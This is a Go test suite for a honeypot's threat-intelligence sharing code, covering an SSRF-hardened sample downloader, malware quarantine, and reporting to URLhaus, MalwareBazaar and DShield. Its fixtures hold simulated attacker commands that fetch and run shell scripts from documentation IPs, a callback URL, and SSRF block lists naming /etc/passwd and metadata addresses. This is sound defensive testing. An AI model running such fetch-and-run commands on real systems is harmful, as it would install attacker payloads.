package main

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"mime"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// Tests der Weitergabe: abgesicherter Download, URLhaus, Quarantäne, MalwareBazaar, DShield.
// Nie gegen die echten Dienste: alle Adressen zeigen auf httptest-Server.

func allowDoc(t *testing.T) {
	shareAllowDocNets = true
	t.Cleanup(func() { shareAllowDocNets = false })
}

func TestSpecialIP(t *testing.T) {
	setOwnNets(OwnNets{Private: true, Nets: []string{"203.0.113.0/28"}})
	t.Cleanup(func() { setOwnNets(OwnNets{Private: true}) })
	bad := []string{"127.0.0.1", "10.1.2.3", "192.168.178.1", "172.20.0.1", "169.254.169.254", "100.64.1.1", "0.1.2.3",
		"224.0.0.1", "255.255.255.255", "::1", "fe80::1", "fd00::1", "::ffff:127.0.0.1", "::ffff:192.168.0.1",
		"64:ff9b::c0a8:1", "2002:c0a8:101::1", "198.18.0.1", "198.51.100.7", "203.0.113.9"}
	for _, s := range bad {
		if why := specialIP(netip.MustParseAddr(s), ""); why == "" {
			t.Errorf("%s gilt als zulässig", s)
		}
	}
	allowDoc(t)
	if why := specialIP(netip.MustParseAddr("198.51.100.7"), ""); why != "" {
		t.Errorf("Dokumentationsadresse im Test: %s", why)
	}
	if why := specialIP(netip.MustParseAddr("203.0.113.5"), ""); why != "eigenes Netz" {
		t.Errorf("eigenes Netz: %q", why)
	}
	if why := specialIP(netip.MustParseAddr("198.51.100.7"), "198.51.100.7"); why == "" {
		t.Error("eigene öffentliche IP zulässig")
	}
}

func TestShareURLProblem(t *testing.T) {
	allowDoc(t)
	ok := []string{"http://198.51.100.20/x.sh", "https://198.51.100.20:8443/bins/a.arm7", "ftp://198.51.100.20/a", "tftp://198.51.100.20/b",
		"http://dl.malware-host.net/x"}
	for _, s := range ok {
		if _, why := shareURLProblem(s, ""); why != "" {
			t.Errorf("%s abgelehnt: %s", s, why)
		}
	}
	bad := []string{"http://127.0.0.1/x", "http://localhost/x", "http://192.168.1.1/x", "http://[::1]/x", "http://nas.local/x",
		"http://fritz.box.lan/x", "http://abc.oast.fun/x", "http://x.interact.sh/", "http://0x7f.1/x", "http://2130706433/x",
		"http://198.51.100.9:99999/x", "file:///etc/passwd", "gopher://198.51.100.9/", "http:///x", "http://router/x",
		"http://198.51.100.30/x"}
	for _, s := range bad {
		if _, why := shareURLProblem(s, "198.51.100.30"); why == "" {
			t.Errorf("%s angenommen", s)
		}
	}
}

// testFetcher: erlaubt 127.0.0.1 (der Testserver), alles andere wie im Betrieb.
func testFetcher(max int64) *safeFetcher {
	f := newSafeFetcher("", "Wget/1.21.4", max)
	f.deny = func(ip netip.Addr) string {
		if ip.Unmap() == netip.MustParseAddr("127.0.0.1") {
			return ""
		}
		return specialIP(ip, "")
	}
	f.timeout = 5 * time.Second
	f.lookup = func(context.Context, string) ([]netip.Addr, error) {
		return []netip.Addr{netip.MustParseAddr("127.0.0.1")}, nil
	}
	return f
}

// hostURL: Adresse des Testservers unter dem Namen name (Auflösung über f.lookup).
func hostURL(srv *httptest.Server, name, path string) string {
	u, _ := url.Parse(srv.URL)
	return "http://" + name + ":" + u.Port() + path
}

func TestSafeFetchOK(t *testing.T) {
	payload := []byte("\x7fELF\x01\x01\x01" + strings.Repeat("A", 100))
	var ua string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ua = r.UserAgent()
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(payload)
	}))
	defer srv.Close()
	f := testFetcher(1 << 20)
	f.lookup = func(context.Context, string) ([]netip.Addr, error) {
		return []netip.Addr{netip.MustParseAddr("127.0.0.1")}, nil
	}
	dir := filepath.Join(t.TempDir(), "q")
	res, err := f.fetchTo(context.Background(), hostURL(srv, "dl.malware-host.net", "/a.elf"), dir)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(payload)
	if res.SHA256 != hex.EncodeToString(sum[:]) || !res.New || ua != "Wget/1.21.4" {
		t.Fatalf("Ergebnis %+v, UA %q", res, ua)
	}
	fi, err := os.Stat(filepath.Join(dir, res.SHA256))
	if err != nil || fi.Size() != int64(len(payload)) {
		t.Fatalf("Datei fehlt: %v", err)
	}
	if fi.Mode().Perm()&0o111 != 0 {
		t.Fatalf("Datei ausführbar: %v", fi.Mode())
	}
	ents, _ := os.ReadDir(dir)
	if len(ents) != 1 {
		t.Fatalf("Reste in der Quarantäne: %d Einträge", len(ents))
	}
	// zweites Mal: schon vorhanden
	if res, err := f.fetchTo(context.Background(), hostURL(srv, "dl.malware-host.net", "/a.elf"), dir); err != nil || res.New {
		t.Fatalf("zweiter Abruf: %+v %v", res, err)
	}
}

func TestSafeFetchBlocksPrivate(t *testing.T) {
	hit := false
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hit = true }))
	defer srv.Close()
	dir := t.TempDir()
	// Im Betrieb ist 127.0.0.1 gesperrt: direkt und über einen Namen
	f := newSafeFetcher("", "Wget/1.21.4", 1<<20)
	if _, err := f.fetchTo(context.Background(), srv.URL+"/x", dir); !errors.Is(err, errFetchDenied) {
		t.Fatalf("Loopback direkt: %v", err)
	}
	f.lookup = func(context.Context, string) ([]netip.Addr, error) {
		return []netip.Addr{netip.MustParseAddr("127.0.0.1")}, nil
	}
	if _, err := f.fetchTo(context.Background(), hostURL(srv, "evil.malware-host.net", "/x"), dir); !errors.Is(err, errFetchDenied) {
		t.Fatalf("Name auf Loopback: %v", err)
	}
	// Name mit gemischten Antworten (öffentlich und privat): als Ganzes gesperrt
	f = testFetcher(1 << 20)
	f.lookup = func(context.Context, string) ([]netip.Addr, error) {
		return []netip.Addr{netip.MustParseAddr("127.0.0.1"), netip.MustParseAddr("192.168.1.1")}, nil
	}
	if _, err := f.fetchTo(context.Background(), hostURL(srv, "mixed.malware-host.net", "/x"), dir); !errors.Is(err, errFetchDenied) {
		t.Fatalf("gemischte Auflösung: %v", err)
	}
	for _, s := range []string{"ftp://198.51.100.9/x", "tftp://198.51.100.9/x", "http://user:pw@dl.malware-host.net/x", "http://nas.local/x"} {
		if _, err := f.fetchTo(context.Background(), s, dir); !errors.Is(err, errFetchDenied) {
			t.Errorf("%s: %v", s, err)
		}
	}
	if hit {
		t.Fatal("gesperrtes Ziel wurde kontaktiert")
	}
}

func TestSafeFetchRedirects(t *testing.T) {
	var mu sync.Mutex
	var paths []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		paths = append(paths, r.URL.Path)
		mu.Unlock()
		switch r.URL.Path {
		case "/to-private":
			http.Redirect(w, r, "http://192.168.178.1/admin", http.StatusFound)
		case "/to-localname":
			http.Redirect(w, r, "http://router.lan/", http.StatusFound)
		case "/to-file":
			http.Redirect(w, r, "file:///etc/passwd", http.StatusFound)
		case "/loop":
			http.Redirect(w, r, "/loop", http.StatusFound)
		case "/rebind":
			http.Redirect(w, r, "/payload", http.StatusFound)
		default:
			w.Write([]byte("payload-bytes"))
		}
	}))
	defer srv.Close()
	dir := t.TempDir()
	f := testFetcher(1 << 20)
	f.lookup = func(context.Context, string) ([]netip.Addr, error) {
		return []netip.Addr{netip.MustParseAddr("127.0.0.1")}, nil
	}
	for _, p := range []string{"/to-private", "/to-localname", "/to-file"} {
		if _, err := f.fetchTo(context.Background(), hostURL(srv, "dl.malware-host.net", p), dir); err == nil {
			t.Errorf("%s: Weiterleitung befolgt", p)
		}
	}
	if _, err := f.fetchTo(context.Background(), hostURL(srv, "dl.malware-host.net", "/loop"), dir); err == nil || !strings.Contains(err.Error(), "nicht erreichbar") && !strings.Contains(err.Error(), "Weiterleitungen") {
		t.Errorf("Schleife: %v", err)
	}
	// DNS-Rebinding: erste Auflösung öffentlich (hier: der erlaubte Testserver), die zweite privat.
	// Jede neue Verbindung wird nach der Auflösung geprüft, also scheitert die Weiterleitung.
	calls := 0
	f.lookup = func(context.Context, string) ([]netip.Addr, error) {
		calls++
		if calls == 1 {
			return []netip.Addr{netip.MustParseAddr("127.0.0.1")}, nil
		}
		return []netip.Addr{netip.MustParseAddr("127.0.0.2")}, nil
	}
	mu.Lock()
	paths = nil
	mu.Unlock()
	if _, err := f.fetchTo(context.Background(), hostURL(srv, "rebind.malware-host.net", "/rebind"), dir); !errors.Is(err, errFetchDenied) {
		t.Fatalf("Rebinding: %v", err)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(paths) != 1 || calls != 2 {
		t.Fatalf("Rebinding: Pfade %v, Auflösungen %d", paths, calls)
	}
}

func TestSafeFetchDialControl(t *testing.T) {
	// Selbst wenn die Auflösung umgangen würde, prüft Dialer.Control die echte Gegenstelle.
	f := testFetcher(1 << 20)
	f.deny = func(ip netip.Addr) string {
		if ip.Unmap() == netip.MustParseAddr("127.0.0.1") {
			return "gesperrt"
		}
		return ""
	}
	if _, err := f.dial(context.Background(), "tcp", "127.0.0.1:9"); !errors.Is(err, errFetchDenied) {
		t.Fatalf("Control: %v", err)
	}
}

func TestSafeFetchLimits(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/big-declared":
			w.Header().Set("Content-Length", "5000")
			w.Write([]byte(strings.Repeat("x", 5000)))
		case "/big-chunked":
			w.Header().Set("Content-Type", "application/octet-stream")
			fl := w.(http.Flusher)
			for i := 0; i < 50; i++ {
				w.Write([]byte(strings.Repeat("y", 100)))
				fl.Flush()
			}
		case "/html":
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.Write([]byte("<html>nope</html>"))
		case "/html-sniffed":
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write([]byte("  <!DOCTYPE html><html></html>"))
		case "/empty":
		case "/404":
			http.NotFound(w, r)
		case "/slow":
			time.Sleep(3 * time.Second)
			w.Write([]byte("late"))
		}
	}))
	defer srv.Close()
	dir := t.TempDir()
	f := testFetcher(1000)
	f.timeout = 1 * time.Second
	for _, p := range []string{"/big-declared", "/big-chunked", "/html", "/html-sniffed", "/empty", "/404", "/slow"} {
		if _, err := f.fetchTo(context.Background(), hostURL(srv, "dl.malware-host.net", p), dir); err == nil {
			t.Errorf("%s angenommen", p)
		}
	}
	ents, _ := os.ReadDir(dir)
	if len(ents) != 0 {
		t.Fatalf("Reste in der Quarantäne: %v", ents)
	}
}

func TestSafeFetchNoProxy(t *testing.T) {
	t.Setenv("HTTP_PROXY", "http://192.0.2.1:3128")
	t.Setenv("HTTPS_PROXY", "http://192.0.2.1:3128")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("data")) }))
	defer srv.Close()
	if _, err := testFetcher(1000).fetchTo(context.Background(), hostURL(srv, "dl.malware-host.net", "/a"), t.TempDir()); err != nil {
		t.Fatalf("Proxy aus der Umgebung benutzt? %v", err)
	}
}

// ---- Funde, URLhaus, Quarantäne ----

func shareHive(t *testing.T) *Hive {
	h := testHive(t)
	h.share.load(h.st)
	h.share.dir = filepath.Join(t.TempDir(), "quarantine")
	return h
}

func addEvent(h *Hive, typ, svc, ip, sensor, asOrg string, data map[string]any) {
	d, _ := json.Marshal(data)
	h.st.db.Exec(`INSERT INTO events(ts,type,src_ip,service,sensor,as_org,data) VALUES(?,?,?,?,?,?,?)`,
		time.Now().UnixMilli(), typ, ip, svc, sensor, asOrg, string(d))
}

func TestURLFindings(t *testing.T) {
	allowDoc(t)
	setOwnNets(OwnNets{Private: true})
	h := shareHive(t)
	addEvent(h, "command", "ssh", "203.0.113.50", "", "", map[string]any{"input": mk("cd /tmp; wg", "et http://198.51.100.20/x.sh; sh x.sh; curl http://127.0.0.1/y")})
	addEvent(h, "download", "telnet", "203.0.113.51", "", "", map[string]any{"url": "http://198.51.100.21/bins/a.mips"})
	addEvent(h, "command", "ssh", "192.168.1.5", "", "", map[string]any{"input": "wget http://198.51.100.22/own.sh"})         // eigener Test
	addEvent(h, "command", "ssh", "203.0.113.52", "", "Censys, Inc.", map[string]any{"input": "wget http://198.51.100.23/c"}) // Forschungsscanner
	addEvent(h, "request", "http", "203.0.113.53", "", "", map[string]any{"path": "/x?u=http://198.51.100.24/w.sh"})          // Web-Pfad
	addEvent(h, "command", "ssh", "203.0.113.54", "", "", map[string]any{"input": "curl http://abc.oast.fun/x"})              // Rückruf
	got, err := h.urlFindings(context.Background(), time.Now().Add(-time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	var urls []string
	for _, f := range got {
		urls = append(urls, f.URL)
	}
	if strings.Join(urls, " ") != "http://198.51.100.20/x.sh http://198.51.100.21/bins/a.mips" {
		t.Fatalf("Funde: %v", urls)
	}
}

func TestURLhausSubmit(t *testing.T) {
	allowDoc(t)
	var mu sync.Mutex
	var bodies []map[string]any
	var keys []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var b map[string]any
		json.NewDecoder(r.Body).Decode(&b)
		mu.Lock()
		bodies = append(bodies, b)
		keys = append(keys, r.Header.Get("Auth-Key"))
		mu.Unlock()
		io.WriteString(w, "inserted")
	}))
	defer srv.Close()
	old := urlhausSubmitURL
	urlhausSubmitURL = srv.URL
	t.Cleanup(func() { urlhausSubmitURL = old })

	h := shareHive(t)
	x := h.Extras()
	x.AbuseChKey = "test-key"
	x.URLhausReport = URLhausReportConfig{Enabled: true, DryRun: true, DailyLimit: 2, VerifiedOnly: false}
	finds := []urlFinding{{URL: "http://198.51.100.20/x.sh", Service: "ssh"}, {URL: "http://198.51.100.21/a", Service: "telnet"}, {URL: "http://198.51.100.22/b", Service: "ssh"}}
	h.urlhausSubmit(context.Background(), x, finds)
	if len(bodies) != 0 {
		t.Fatal("Probemodus hat gesendet")
	}
	if n := h.share.count("urlhaus", time.Time{}, func(e shareLogEntry) bool { return e.Status == "dry" }); n != 2 {
		t.Fatalf("Probemodus: %d Einträge, Tageslimit 2", n)
	}
	// echter Lauf: nur bestätigte Adressen
	x.URLhausReport = URLhausReportConfig{Enabled: true, DailyLimit: 10, VerifiedOnly: true}
	// geholt, aber keine Schadsoftware (JSON, PDF ...): nie melden (Audit 4)
	h.st.lookupPut(urlSubject(finds[0].URL), "sample_fetch", `{"status":"ok"}`)
	h.st.lookupPut(urlSubject(finds[1].URL), "sample_fetch", `{"status":"ok","file_tag":"elf","malware":true}`)
	h.st.lookupPut(urlSubject(finds[2].URL), "sample_fetch", `{"status":"error"}`)
	h.urlhausSubmit(context.Background(), x, finds)
	if len(bodies) != 1 || keys[0] != "test-key" {
		t.Fatalf("Anfragen: %d", len(bodies))
	}
	sub := bodies[0]["submission"].([]any)
	if len(sub) != 1 || bodies[0]["anonymous"] != "0" {
		t.Fatalf("Meldung: %v", bodies[0])
	}
	it := sub[0].(map[string]any)
	if it["url"] != finds[1].URL || it["threat"] != "malware_download" {
		t.Fatalf("Eintrag: %v", it)
	}
	tags, _ := json.Marshal(it["tags"])
	if string(tags) != `["honeypot","telnet","elf"]` {
		t.Fatalf("Tags: %s", tags)
	}
	// nie doppelt
	h.urlhausSubmit(context.Background(), x, finds)
	if len(bodies) != 1 {
		t.Fatal("doppelt gemeldet")
	}
}

func TestURLhausErrorPauses(t *testing.T) {
	allowDoc(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Error(w, "bad key", http.StatusUnauthorized) }))
	defer srv.Close()
	old := urlhausSubmitURL
	urlhausSubmitURL = srv.URL
	t.Cleanup(func() { urlhausSubmitURL = old })
	h := shareHive(t)
	x := h.Extras()
	x.AbuseChKey = "k"
	x.URLhausReport = URLhausReportConfig{Enabled: true, DailyLimit: 10}
	h.urlhausSubmit(context.Background(), x, []urlFinding{{URL: "http://198.51.100.20/x"}})
	if h.share.begin("urlhaus") {
		t.Fatal("nach 401 nicht pausiert")
	}
	if _, _, done := h.st.lookupGet(urlSubject("http://198.51.100.20/x"), "urlhaus_report", 0); done {
		t.Fatal("Fehler als gemeldet vermerkt")
	}
}

func TestCollectSampleLimitsAndBazaar(t *testing.T) {
	allowDoc(t)
	elf := []byte(mk("\x7fE", "LF\x01\x01\x01") + strings.Repeat("\x00", 11) + "\x28\x00" + strings.Repeat("B", 200))
	var fetches int
	files := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fetches++
		w.Write(append(append([]byte{}, elf...), r.URL.Path...)) // je Pfad eine andere Datei
	}))
	defer files.Close()
	var uploads []map[string]any
	bazaar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ct, params, _ := mime.ParseMediaType(r.Header.Get("Content-Type"))
		if ct == "multipart/form-data" {
			mr := multipart.NewReader(r.Body, params["boundary"])
			up := map[string]any{}
			for {
				p, err := mr.NextPart()
				if err != nil {
					break
				}
				b, _ := io.ReadAll(p)
				up[p.FormName()] = string(b)
			}
			uploads = append(uploads, up)
			io.WriteString(w, `{"query_status":"inserted"}`)
			return
		}
		r.ParseForm()
		if r.Form.Get("query") != "get_info" {
			http.Error(w, "?", 400)
			return
		}
		io.WriteString(w, `{"query_status":"hash_not_found"}`)
	}))
	defer bazaar.Close()
	oldB := bazaarBase
	bazaarBase = bazaar.URL
	t.Cleanup(func() { bazaarBase = oldB })

	h := shareHive(t)
	x := h.Extras()
	x.AbuseChKey = "k"
	x.Samples.Enabled, x.Samples.DailyLimit, x.Samples.PerHostDaily = true, 3, 2
	x.Bazaar = BazaarConfig{Lookup: true, Upload: true}
	// Der Testserver liegt auf 127.0.0.1; collectSample nutzt den Fetcher des Betriebs, also
	// zeigt die Adresse auf einen Namen, den testFetcher auflöst … hier einfacher: direkt
	// über fetchTo mit testFetcher und danach die Auswertung prüfen.
	f := testFetcher(1 << 20)
	res, err := f.fetchTo(context.Background(), hostURL(files, "dl.malware-host.net", "/a"), h.quarantineDir())
	if err != nil {
		t.Fatal(err)
	}
	si, err := h.loadSample(res.SHA256)
	if err != nil || fileTag(si) != "elf" || si.Arch != "ARM" {
		t.Fatalf("Auswertung: %+v %v", si, err)
	}
	h.bazaarHandle(context.Background(), x, res.SHA256, si, "http://198.51.100.20/a")
	if len(uploads) != 1 {
		t.Fatalf("Uploads: %d", len(uploads))
	}
	var meta map[string]any
	json.Unmarshal([]byte(uploads[0]["json_data"].(string)), &meta)
	if meta["delivery_method"] != "web_download" || uploads[0]["file"] != string(append(append([]byte{}, elf...), "/a"...)) {
		t.Fatalf("Upload: %v", meta)
	}
	tags, _ := json.Marshal(meta["tags"])
	if string(tags) != `["honeypot","elf","arm"]` {
		t.Fatalf("Tags: %s", tags)
	}
	h.bazaarHandle(context.Background(), x, res.SHA256, si, "")
	if len(uploads) != 1 {
		t.Fatal("doppelt hochgeladen")
	}
	// Text wird nie hochgeladen
	if bazaarEligible(analyzeSample([]byte("hello world"))) {
		t.Fatal("Text hochladbar")
	}
	// Limits je Server und Tag (über die Protokolleinträge)
	h.share.add("sample", shareLogEntry{Time: time.Now(), Host: "198.51.100.20", Status: "ok"})
	h.share.add("sample", shareLogEntry{Time: time.Now(), Host: "198.51.100.20", Status: "error"})
	before := fetches
	if !h.collectSample(context.Background(), x, urlFinding{URL: "http://198.51.100.20/b"}) || fetches != before {
		t.Fatal("Limit je Server nicht beachtet")
	}
	h.share.add("sample", shareLogEntry{Time: time.Now(), Host: "198.51.100.21", Status: "ok"})
	if h.collectSample(context.Background(), x, urlFinding{URL: "http://198.51.100.22/c"}) {
		t.Fatal("Tageslimit nicht beachtet")
	}
}

func TestCollectSampleRefusesOwnAndFTP(t *testing.T) {
	allowDoc(t)
	h := shareHive(t)
	h.st.lookupPut("self", "internetdb", `{"ip":"198.51.100.40"}`)
	x := h.Extras()
	x.Samples.Enabled = true
	for _, u := range []string{"http://198.51.100.40/x", "ftp://198.51.100.41/x", "tftp://198.51.100.41/x"} {
		h.collectSample(context.Background(), x, urlFinding{URL: u})
	}
	if n := h.share.count("sample", time.Time{}, func(shareLogEntry) bool { return true }); n != 0 {
		t.Fatalf("%d Versuche", n)
	}
}

func TestQuarantineCleanup(t *testing.T) {
	h := shareHive(t)
	dir := h.quarantineDir()
	os.MkdirAll(dir, 0o700)
	write := func(content string, age time.Duration) string {
		sum := sha256.Sum256([]byte(content))
		name := hex.EncodeToString(sum[:])
		p := filepath.Join(dir, name)
		os.WriteFile(p, []byte(content), 0o600)
		ts := time.Now().Add(-age)
		os.Chtimes(p, ts, ts)
		return name
	}
	old := write("old", 40*24*time.Hour)
	big1 := write(strings.Repeat("a", 6<<20), 3*time.Hour)
	big2 := write(strings.Repeat("b", 6<<20), time.Hour)
	os.WriteFile(filepath.Join(dir, "README"), []byte("x"), 0o600) // fremde Datei bleibt
	part := filepath.Join(dir, ".part-123")
	os.WriteFile(part, []byte("x"), 0o600)
	os.Chtimes(part, time.Now().Add(-2*time.Hour), time.Now().Add(-2*time.Hour))
	h.cleanupQuarantine(SampleCollectConfig{KeepDays: 14, MaxTotalMB: 10}, true)
	exists := func(n string) bool { _, err := os.Stat(filepath.Join(dir, n)); return err == nil }
	if exists(old) || exists(big1) || !exists(big2) || !exists("README") || exists(".part-123") {
		t.Fatalf("alt %v, groß1 %v, groß2 %v", exists(old), exists(big1), exists(big2))
	}
}

func TestShareStatusNoContent(t *testing.T) {
	h := shareHive(t)
	os.MkdirAll(h.quarantineDir(), 0o700)
	content := "#!/bin/sh\necho secret-content\n"
	sum := sha256.Sum256([]byte(content))
	os.WriteFile(filepath.Join(h.quarantineDir(), hex.EncodeToString(sum[:])), []byte(content), 0o600)
	rec := httptest.NewRecorder()
	h.shareStatus(rec, httptest.NewRequest("GET", "/api/share/status", nil))
	if rec.Code != 200 || strings.Contains(rec.Body.String(), "secret-content") || !strings.Contains(rec.Body.String(), hex.EncodeToString(sum[:])) {
		t.Fatalf("Status: %d %s", rec.Code, rec.Body.String())
	}
}

// ---- DShield ----

func TestDShieldAuth(t *testing.T) {
	nonce := []byte("12345678")
	got := dshieldAuth(4711, "c2VjcmV0", nonce)
	n := base64.StdEncoding.EncodeToString(nonce)
	m := hmac.New(sha256.New, []byte(n+"4711"))
	m.Write([]byte("c2VjcmV0"))
	want := "ISC-HMAC-SHA256 Credentials=" + base64.StdEncoding.EncodeToString(m.Sum(nil)) + " Userid=4711 Nonce=" + n
	if got != want {
		t.Fatalf("%s\n%s", got, want)
	}
}

func TestDShieldRound(t *testing.T) {
	allowDoc(t)
	setOwnNets(OwnNets{Private: true})
	var mu sync.Mutex
	got := map[string][]map[string]any{}
	var auth []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var b struct {
			Type string           `json:"type"`
			Logs []map[string]any `json:"logs"`
		}
		json.NewDecoder(r.Body).Decode(&b)
		mu.Lock()
		got[b.Type] = append(got[b.Type], b.Logs...)
		auth = append(auth, r.Header.Get("X-ISC-Authorization")+"|"+r.Header.Get("X-ISC-LogType"))
		mu.Unlock()
	}))
	defer srv.Close()
	old := dshieldSubmitURL
	dshieldSubmitURL = srv.URL
	t.Cleanup(func() { dshieldSubmitURL = old })

	h := shareHive(t)
	h.st.lookupPut("self", "internetdb", `{"ip":"198.51.100.40"}`)
	x := h.Extras()
	x.DShield = DShieldConfig{Enabled: true, UserID: 4711, APIKey: "c2VjcmV0", Firewall: true, Web: true, Logins: true}
	b, _ := json.Marshal(x)
	h.st.SetKV("extras", string(b))
	h.loadExtras()
	h.st.SetKV("dshield_last_id", "0")
	ins := func(typ, svc, ip string, port int, user, pw string, data map[string]any) {
		d, _ := json.Marshal(data)
		h.st.db.Exec(`INSERT INTO events(ts,type,src_ip,src_port,dst_port,service,username,password,data) VALUES(?,?,?,?,?,?,?,?,?)`,
			time.Now().Add(-5*time.Minute).UnixMilli(), typ, ip, 40000, port, svc, user, pw, string(d))
	}
	ins("connect", "ftp", "203.0.113.50", 10021, "", "", nil)
	ins("connect", "sip", "203.0.113.51", 5060, "", "", nil)
	ins("connect", "ssh", "192.168.178.20", 22, "", "", nil) // eigenes Netz
	ins("connect", "ssh", "198.51.100.40", 22, "", "", nil)  // eigene öffentliche IP
	ins("request", "http", "203.0.113.52", 80, "", "", map[string]any{"method": "GET", "path": "/cgi-bin/x?ip=198.51.100.40",
		"user_agent": "curl/8", "version": "HTTP/1.1", "headers": "Host: 198.51.100.40\nUser-Agent: curl/8"})
	ins("login", "ssh", "203.0.113.53", 22, "root", "123456", nil)
	ins("login", "ftp", "203.0.113.53", 21, "anonymous", "x", nil) // kein SSH/Telnet
	h.dshieldRound(context.Background())
	mu.Lock()
	defer mu.Unlock()
	if len(got["firewall"]) != 2 || len(got["webhoneypot"]) != 1 || len(got["cowrie"]) != 1 {
		t.Fatalf("gesendet: %v", got)
	}
	fw := got["firewall"][0]
	if fw["sip"] != "203.0.113.50" || fw["dip"] != "0.0.0.0" || fw["dport"] != "21" || fw["proto"] != float64(6) {
		t.Fatalf("Firewall: %v", fw)
	}
	if got["firewall"][1]["proto"] != float64(17) {
		t.Fatalf("UDP: %v", got["firewall"][1])
	}
	all, _ := json.Marshal(got)
	if strings.Contains(string(all), "198.51.100.40") || strings.Contains(string(all), "192.168.") {
		t.Fatalf("eigene Adresse gesendet: %s", all)
	}
	web := got["webhoneypot"][0]
	if web["url"] != "/cgi-bin/x?ip=[host]" || web["headers"].(map[string]any)["Host"] != nil {
		t.Fatalf("Web: %v", web)
	}
	if lg := got["cowrie"][0]; lg["user"] != "root" || lg["password"] != "123456" || lg["source_ip"] != "203.0.113.53" {
		t.Fatalf("Anmeldung: %v", lg)
	}
	if !strings.HasPrefix(auth[0], "ISC-HMAC-SHA256 Credentials=") || !strings.Contains(auth[0], "Userid=4711") {
		t.Fatalf("Kopf: %v", auth)
	}
	// zweiter Lauf: nichts doppelt (läuft ohnehin erst nach 55 Minuten wieder)
	n := len(auth)
	h.share.mu.Lock()
	h.share.channel("dshield").LastRun = time.Time{}
	h.share.mu.Unlock()
	mu.Unlock()
	h.dshieldRound(context.Background())
	mu.Lock()
	if len(auth) != n {
		t.Fatal("doppelt gesendet")
	}
}

func TestShareValidate(t *testing.T) {
	x := defaultExtras()
	if err := x.Validate(); err != nil {
		t.Fatal(err)
	}
	x.DShield.Enabled = true
	if err := x.Validate(); err == nil {
		t.Fatal("DShield ohne Konto angenommen")
	}
	x = defaultExtras()
	x.Samples.UserAgent = "Wget\n"
	if err := x.Validate(); err == nil {
		t.Fatal("User-Agent mit Zeilenumbruch")
	}
	x = defaultExtras()
	x.DShield.APIKey = "a b"
	if err := x.Validate(); err == nil {
		t.Fatal("Schlüssel mit Leerzeichen")
	}
	if _, ok := x.secretFields()["dshield_key"]; !ok {
		t.Fatal("DShield-Schlüssel kein Geheimnis")
	}
}
